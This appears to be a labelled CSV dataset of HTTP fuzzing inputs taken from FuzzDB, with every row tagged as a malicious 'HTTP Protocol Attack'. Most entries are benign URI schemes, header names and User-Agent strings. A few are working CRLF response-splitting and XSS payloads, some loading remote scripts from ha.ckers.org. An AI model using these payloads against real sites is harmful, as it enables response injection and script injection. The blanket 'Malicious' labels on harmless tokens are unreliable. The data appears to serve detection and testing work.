Payload,Signature,AttackType,Severity,MITRE,Label,Description
skype:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
wtai:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
msnim:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
BASELINE-CONTROL,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
&id=1;id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
INDEX,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
irc:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
adiumxtra:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
gtalk:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
bolo:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
rmi:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
soldat:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Frame-Options,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ldap:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
vemmi:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Allow,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
sip:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ETag,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
h323:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
DNT,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Encoding,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Access-Control-Allow-Origin,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Forwarded-Proto,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
MKACTIVITY,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Via,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Wget/1.8.2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
\r\n,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
P3P,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Last-Modified,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Front-End-Https,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
msrp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
telnet:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
VERSION-CONTROL,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
iax:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
r%0d%0aContentLength:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContentType:%20text/html%0d%0aContentLength:%2019%0d%0a%0d%0a<html>Injected%02Content</html>,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Length,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
UNCHECKOUT,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Forwarded-Host,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
service:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Transfer-Encoding,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.19) Gecko/20081204 SeaMonkey/1.1.14,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
chrome:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
doi:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
palm:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Authorization,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ventrilo:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
webcal:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
SEARCH,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Proxy-Connection,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
UNLOCK,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
DEBUG,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Proxy-Authenticate,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mtqp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
coap:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0d%0a%0d%0a%3Cscript+src%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2Fscript%3E,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
wyciwyg:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0d%0a%0d%0a%3Chtml%3E%3Cbody%3E%3C%2Fbody%3E%3Cscript+src%3Dhttp%3A%2F%2Fha.ckers.org%2Fs.js%3E%3C%2Fscript%3E%3Cscript%3Ealert(%22location.host%20is:%20%22%2Blocation.host)%3C%2Fscript%3E%3C%2Fhtml%3E,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1%u0026;id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
iris.xpcs:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
fish:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
iris.lws:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
wais:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
If-Modified-Since,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%22%3E%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E%3C%22,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id[1&id=2]=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
info:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
0x0D0x0A,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
xmlrpc.beeps:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
callto:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
tel:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
finger:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
steam:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
itms:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
spotify:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1%26id%3D2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mvn:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.7) Gecko/20070606,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id['&id=1']=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
tftp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
MKWORKSPACE,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Http-Method-Override,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ipp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
market:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
&&&&id=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
PROPPATCH,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ircs:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Upgrade,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
cap:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ed2k:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
proxy:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
thismessage:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
If-Match,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0%0d%0ad%0%0d%0aa,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
aaa:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Powered-By,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Cookie,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Accept-Datetime,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
UNSUBSCRIBE,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
BPROPPATCH,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id==1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
pres:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
smb:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Vary,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
geo:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Status,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mumble:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
PROPFIND,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0d%0a%0d%0a,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
From,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
uuid:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
nfs:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Type,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ymsgr:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Warning,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
icap:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ORDERPATCH,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%5cr%5cn,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
fax:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0d%0a%0d%0a%3Cscript%3Ealert(%22XSS%22)%3C%2Fscript%3E,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Trailer,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mupdate:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0d%0d%0a%0a,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10 (.NET CLR 3.5.30729) JBroFuzz/1.4,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
TRACE,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
opaquelocktoken:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
WWW-Authenticate,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mms:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
iris:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
xri:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ssh:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id[=1&id=2]=3,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Accept-Language,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id;id=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
&id=1?id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
z39.50r:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
dict:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
z39.50s:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=id['1']=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
REPORT,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.4) Gecko/2008102920 Firefox/3.0.4,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
aw:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
svn:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
udp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Set-Cookie,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
feed:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
gg:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
LOCK,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-MS-ENUMATTS,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id&id=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 4.0),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Disposition,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Accept-Encoding,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
0x0D0x0D0x0A0x0A,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=/:@&=+$&id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
afp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Connection,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
view-source:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1%26id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
things:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
iris.beep:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mailto:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
rtsp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
sgn:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
http:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Range,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:0.9.2) Gecko/20010726 Netscape6/6.1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
nntp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mid:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
notes:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
TRACK,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
POST,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
https:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
prospero:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
git:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Security-Policy,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
BCOPY,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
keyparc:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
soap.beep:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
POLL,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
file:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Max-Forwards,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
NOTIFY,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.79 [en] (WinNT; U),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
secondlife:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
sftp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
&id=1&id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
If-Range,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
query:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
